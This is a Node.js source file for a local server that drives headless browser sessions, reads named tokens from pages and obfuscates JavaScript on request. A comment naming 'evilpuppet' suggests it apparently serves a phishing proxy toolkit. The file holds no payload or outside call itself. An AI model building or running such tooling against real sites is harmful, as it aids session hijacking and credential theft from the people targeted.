const Browser = require('./browser');
const Server = require('./server');
const Obfuscator = require('./obfuscator');

const browser = new Browser(false);
const obfuscator = new Obfuscator();

const bindAddr = '127.0.0.1';
const bindPort = 44500;

async function createPage(session_id, interceptors) {
    var page = await browser.createPage(session_id, JSON.parse(interceptors));
    if (page == null) {
        console.log("setup: page is null - reconnecting to the browser");
        await browser.close();
        page = await browser.createPage(session_id, JSON.parse(interceptors));
        if (page == null) {
            console.log("setup: fatal error: cannot open browser connection");
        }
    }
    return page;
}

async function packetHandler(s, p) {
    //console.log(p);
    switch (p.command) {
        case "close":
            console.log("close: " + p.session_id);
            await browser.closePage(p.session_id);
            // TODO: return confirmation message and have evilpuppet wait for response before killing socket!
            s.write(JSON.stringify(p)+"\n\n");
            break;
        case "setup":
        {
            var page = await createPage(p.session_id, p.interceptors);
            if (page == null) {
                break;
            }
            await page.OpenUrl("about:blank");
            s.write(JSON.stringify(p)+"\n\n");
            break;
        }
        /*
        case "open-url":
        {
            const page = await browser.createPage(p.session_id, JSON.parse(p.interceptors));
            const [err, ret] = await page.OpenUrl(p.contents);
            if (!ret) {
                p.type = "error";
                p.contents = "failed to open url: " + err;
            }
            s.write(JSON.stringify(p)+"\n\n");
            break;
        }*/
        case "action":
        {
            const page = await createPage(p.session_id, p.interceptors);
            if (page == null) {
                break;
            }
            const [err, ret] = await page.DoAction(JSON.parse(p.contents));
            if (!ret) {
                p.type = "error";
                p.contents = "action failed: " + err;
            }
            s.write(JSON.stringify(p)+"\n\n");
            break;
        }
        case "get-tokens":
        {
            var names = JSON.parse(p.contents);

            const page = await createPage(p.session_id, p.interceptors);
            if (page == null) {
                break;
            }
            var tokens = page.GetTokens(names);
            if (tokens != null) {
                p.contents = JSON.stringify(tokens);
            } else {
                p.type = "error";
                p.contents = "tokens not found: " + names;
            }
            s.write(JSON.stringify(p)+"\n\n");
            break;
        }
        case "javascript-obfuscator":
        {
            var obf_script = await obfuscator.obfuscate(p.contents);
            p.contents = obf_script;
            s.write(JSON.stringify(p)+"\n\n");
            console.log("js: obfuscated output size: " + obf_script.length)
            break;
        }
    }
}

console.log("listening on: " + bindAddr + ":" + bindPort);
const server = new Server(bindAddr, bindPort, packetHandler);
server.listen();
